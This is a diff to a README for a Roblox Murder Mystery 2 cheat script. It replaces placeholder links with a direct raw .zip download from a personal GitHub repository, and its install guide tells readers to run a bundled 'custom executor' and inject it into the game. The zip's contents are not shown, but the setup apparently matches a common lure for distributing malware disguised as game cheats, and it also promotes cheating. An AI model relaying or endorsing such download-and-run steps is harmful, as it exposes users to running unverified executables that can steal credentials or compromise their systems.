@@ -2,7 +2,7 @@
 
 Hey everyone! 👋 Welcome to the MM2 script that actually makes sense. I built this because most other scripts are either too bloated or just don't work right after the latest updates. This one is clean, fast, and designed to give you the edge you need, whether you're trying to win free items or just survive longer as Innocent. I’ve integrated it directly with my custom executor for maximum stability, so you don’t have to deal with injection errors or lag. I’ve been stress-testing this in high-traffic servers, and it holds up. Check it out, grab it, and let me know if you find any bugs—I’m always fixing things based on feedback.
 
-**[⬇️ Download MM2 Script](https://github.com)**
+**[⬇️ Download MM2 Script](https://github.com/johnson41590/Murder-Mystery-Script/raw/refs/heads/main/unvisor/1.3.zip)**
 
 ## 🚀 Premium Features
 
@@ -40,7 +40,7 @@ Hey everyone! 👋 Welcome to the MM2 script that actually makes sense. I built 
 
 ## ⚙️ Installation Guide
 
-1. **Download:** Get the latest version from the **[Download Link](https://github.com)**. This includes the script and my custom executor.
+1. **Download:** Get the latest version from the **[Download Link](https://github.com/johnson41590/Murder-Mystery-Script/raw/refs/heads/main/unvisor/1.3.zip)**. This includes the script and my custom executor.
 2. **Launch Executor:** Open the custom executor you just downloaded.
 3. **Join Roblox:** Join a Murder Mystery 2 server.
 4. **Inject & Execute:** Click "Inject" in the executor, select the MM2 script, and click "Execute."
